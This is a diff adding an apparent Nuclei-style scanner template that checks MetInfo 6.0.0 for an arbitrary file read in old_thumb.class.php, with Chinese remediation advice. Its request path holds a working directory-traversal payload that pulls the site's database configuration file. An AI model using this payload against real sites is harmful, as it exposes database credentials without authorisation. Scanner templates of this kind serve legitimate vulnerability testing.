@@ -1,0 +1,24 @@
+id: Metinfo-V6_0_0_old_thumb_class_php-FileRead
+info:
+  name: metinfo 6.0.0 old_thumb.class.php 任意文件读取漏洞
+  author:
+  - l0ne1y
+  description: |-
+    metinfo 6.0.0 old_thumb.class.php 任意文件读取漏洞
+    MetInfo是一套使用PHP和Mysql开发的内容管理系统。 MetInfo 6.0.0版本中的 old_thumb.class.php文件存在任意文件读取漏洞。攻击者可利用漏洞读取网站上的敏感文件。
+  severity: high
+  remediation: |-
+    修复建议
+
+    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁
+    https://www.metinfo.cn
+    临时修复方案：<br />1、过滤\".\"，使用户在url中不能回溯上级目录。<br />2、正则匹配严格判断用户输入参数的格式，对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。<br />3、禁止系统提供目录遍历服务，如：php.ini配置open_basedir限定文件访问范围。<br />4、文件路径保存至数据库，让用户提交文件对应ID下载文件。<br />5、用户下载文件之前进行权限校验。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - status_code==200 && contains(body,"con_db_id") && contains(body,"con_db_name")
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/member/index.php?a=doshow&m=include&c=old_thumb&dir=http/./.../..././/./.../..././/config/config_db.php'
+  method: GET
